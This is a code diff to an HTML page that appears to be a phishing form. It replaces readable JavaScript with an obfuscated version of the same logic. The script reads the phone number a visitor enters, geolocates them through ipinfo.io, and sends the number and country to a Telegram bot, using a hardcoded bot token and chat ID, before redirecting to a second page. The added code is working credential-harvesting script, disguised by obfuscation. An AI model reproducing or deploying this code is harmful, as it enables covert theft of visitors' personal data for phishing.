@@ -49,62 +49,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 
    <script>
-        const botToken = '7637768536:AAFBR5maC19HT1kLRb9PI4ynubtztkEUTPk';  // Replace with your Telegram bot token
-        const chatId = '7672163375';      // Replace with your chat ID (can be group chat or your Telegram ID)
-
-        const phoneInputField = document.querySelector("#phone");
-        const errorMsg = document.querySelector("#error-msg");
-        const validMsg = document.querySelector("#valid-msg");
-
-        // Initialize the international input plugin
-        const phoneInput = window.intlTelInput(phoneInputField, {
-            initialCountry: "auto",
-            geoIpLookup: function (callback) {
-                fetch('https://ipinfo.io', { headers: { 'Accept': 'application/json' } })
-                    .then((resp) => resp.json())
-                    .then((resp) => {
-                        const countryCode = resp && resp.country ? resp.country : "us";
-                        callback(countryCode);
-                    });
-            },
-            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
-        });
-
-        // Function to send phone number to Telegram and navigate to the second page
-        function sendPhoneNumber() {
-            const phoneNumber = phoneInput.getNumber();
-            const countryName = phoneInput.getSelectedCountryData().name;
-
-            if (phoneInput.isValidNumber()) {
-                validMsg.style.display = 'block';
-                errorMsg.style.display = 'none';
-
-                // Prepare the message for Telegram
-                const message = `Phone Number: ${phoneNumber}\nCountry: ${countryName}`;
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-                // Send the data to Telegram
-                fetch(url)
-                    .then(response => {
-                        if (response.ok) {
-                            // Save phone number and country name to localStorage for the second page
-                            localStorage.setItem('phoneNumber', phoneNumber);
-                            localStorage.setItem('countryName', countryName);
-
-                            // Redirect to the second page
-                            window.location.href = "second-page.html";
-                        } else {
-                            alert('Failed to send data to Telegram');
-                        }
-                    })
-                    .catch(error => {
-                        alert('Error sending data: ' + error);
-                    });
-            } else {
-                validMsg.style.display = 'none';
-                errorMsg.style.display = 'block';
-            }
-        }
+        const _0x42dba2=_0x136e;function _0x136e(_0x4a51e6,_0x53d85c){const _0x29de2b=_0x29de();return _0x136e=function(_0x136eaa,_0x3df6af){_0x136eaa=_0x136eaa-0x1ca;let _0x49ea07=_0x29de2b[_0x136eaa];return _0x49ea07;},_0x136e(_0x4a51e6,_0x53d85c);}(function(_0xe91301,_0x4fc7dc){const _0x3cdcff=_0x136e,_0x12c21c=_0xe91301();while(!![]){try{const _0x2a96e4=parseInt(_0x3cdcff(0x1e5))/0x1+parseInt(_0x3cdcff(0x1e9))/0x2*(-parseInt(_0x3cdcff(0x1e4))/0x3)+-parseInt(_0x3cdcff(0x1d6))/0x4+parseInt(_0x3cdcff(0x1d0))/0x5+-parseInt(_0x3cdcff(0x1de))/0x6*(parseInt(_0x3cdcff(0x1d5))/0x7)+parseInt(_0x3cdcff(0x1e2))/0x8+parseInt(_0x3cdcff(0x1e7))/0x9*(-parseInt(_0x3cdcff(0x1cd))/0xa);if(_0x2a96e4===_0x4fc7dc)break;else _0x12c21c['push'](_0x12c21c['shift']());}catch(_0x5a8aff){_0x12c21c['push'](_0x12c21c['shift']());}}}(_0x29de,0x59929));function _0x29de(){const _0x326f36=['7672163375','countryName','querySelector','catch','1673410nHgBfs','then','display','1781945QJREAC','json','/sendMessage?chat_id=','second-page.html','#phone','826ZNcMGP','1658800cmfJCA','getNumber','#error-msg','block','setItem','intlTelInput','Phone\x20Number:\x20','auto','1476mIiGXx','getSelectedCountryData','https://api.telegram.org/bot','Error\x20sending\x20data:\x20','2651280kPYiJi','location','131460yXlpFe','333979eVDiHY','style','9voLjqQ','name','2EYgTQe','country','href','isValidNumber','https://ipinfo.io','&text='];_0x29de=function(){return _0x326f36;};return _0x29de();}const botToken='7637768536:AAFBR5maC19HT1kLRb9PI4ynubtztkEUTPk',chatId=_0x42dba2(0x1ef),phoneInputField=document[_0x42dba2(0x1cb)](_0x42dba2(0x1d4)),errorMsg=document[_0x42dba2(0x1cb)](_0x42dba2(0x1d8)),validMsg=document['querySelector']('#valid-msg'),phoneInput=window[_0x42dba2(0x1db)](phoneInputField,{'initialCountry':_0x42dba2(0x1dd),'geoIpLookup':function(_0x2fee7e){const _0x34fae7=_0x42dba2;fetch(_0x34fae7(0x1ed),{'headers':{'Accept':'application/json'}})[_0x34fae7(0x1ce)](_0x309bc8=>_0x309bc8[_0x34fae7(0x1d1)]())['then'](_0xd06d89=>{const _0x2e1ece=_0x34fae7,_0x3f79c0=_0xd06d89&&_0xd06d89[_0x2e1ece(0x1ea)]?_0xd06d89[_0x2e1ece(0x1ea)]:'us';_0x2fee7e(_0x3f79c0);});},'utilsScript':'https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js'});function sendPhoneNumber(){const _0x43a4c9=_0x42dba2,_0x14fdf5=phoneInput[_0x43a4c9(0x1d7)](),_0x2c1afd=phoneInput[_0x43a4c9(0x1df)]()[_0x43a4c9(0x1e8)];if(phoneInput[_0x43a4c9(0x1ec)]()){validMsg[_0x43a4c9(0x1e6)]['display']=_0x43a4c9(0x1d9),errorMsg['style'][_0x43a4c9(0x1cf)]='none';const _0x213cf6=_0x43a4c9(0x1dc)+_0x14fdf5+'\x0aCountry:\x20'+_0x2c1afd,_0x1a8483=_0x43a4c9(0x1e0)+botToken+_0x43a4c9(0x1d2)+chatId+_0x43a4c9(0x1ee)+encodeURIComponent(_0x213cf6);fetch(_0x1a8483)['then'](_0x877e43=>{const _0x42dad3=_0x43a4c9;_0x877e43['ok']?(localStorage[_0x42dad3(0x1da)]('phoneNumber',_0x14fdf5),localStorage[_0x42dad3(0x1da)](_0x42dad3(0x1ca),_0x2c1afd),window[_0x42dad3(0x1e3)][_0x42dad3(0x1eb)]=_0x42dad3(0x1d3)):alert('Failed\x20to\x20send\x20data\x20to\x20Telegram');})[_0x43a4c9(0x1cc)](_0x53777e=>{const _0x5d30d1=_0x43a4c9;alert(_0x5d30d1(0x1e1)+_0x53777e);});}else validMsg[_0x43a4c9(0x1e6)]['display']='none',errorMsg[_0x43a4c9(0x1e6)][_0x43a4c9(0x1cf)]=_0x43a4c9(0x1d9);}
     </script>
     
 </body>
